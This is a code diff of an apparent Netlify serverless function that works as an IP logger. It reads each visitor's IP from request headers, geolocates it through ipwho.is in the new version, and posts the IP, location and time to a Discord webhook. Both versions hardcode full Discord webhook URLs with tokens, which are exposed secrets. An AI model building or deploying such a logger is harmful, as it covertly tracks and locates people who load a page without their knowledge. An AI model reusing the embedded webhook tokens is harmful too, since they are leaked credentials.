@@ -1,42 +1,47 @@
-exports.handler = async (event) => {
-  const webhookURL = "https://discord.com/api/webhooks/1347303016960888862/tJhE5rbEck2YenBeyPQmP-8x60moVrX-4Xb7UTl6SSV0OT8A8HxbNKpUnWOU6Njf6qtQ"; // Replace this
+const fetch = require('node-fetch');
+
+exports.handler = async (event, context) => {
+  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";
 
   const ip =
-    event.headers["x-nf-client-connection-ip"] ||
-    event.headers["x-forwarded-for"] ||
-    event.headers["client-ip"] ||
-    "Unknown IP";
+    event.headers['x-nf-client-connection-ip'] ||
+    event.headers['client-ip'] ||
+    event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+    'Unknown IP';
 
-  const userAgent = event.headers["user-agent"] || "Unknown";
-  const time = new Date().toISOString();
-
-  const ipMessage = { content: ip };
-  const infoMessage = {
-    content: `User Agent: ${userAgent}\nTime: ${time}`,
-  };
+  const timestamp = new Date().toISOString();
 
   try {
-    await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(ipMessage),
-    });
+    const geoRes = await fetch(`http://ipwho.is/${ip}`);
+    const geoData = await geoRes.json();
+
+    const {
+      country = "N/A",
+      region = "N/A",
+      city = "N/A"
+    } = geoData;
+
+    const message = {
+      content: `**IP:** ${ip}
+**Location:** ${city}, ${region}, ${country}
+**Time:** ${timestamp}`
+    };
 
     await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(infoMessage),
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message),
     });
 
     return {
       statusCode: 200,
-      body: "IP logged successfully!",
+      body: 'IP & location sent!',
     };
-  } catch (err) {
-    console.error("Error sending to Discord:", err);
+  } catch (error) {
+    console.error('Webhook failed:', error);
     return {
       statusCode: 500,
-      body: "Failed to send webhook.",
+      body: 'Error sending data',
     };
   }
 };
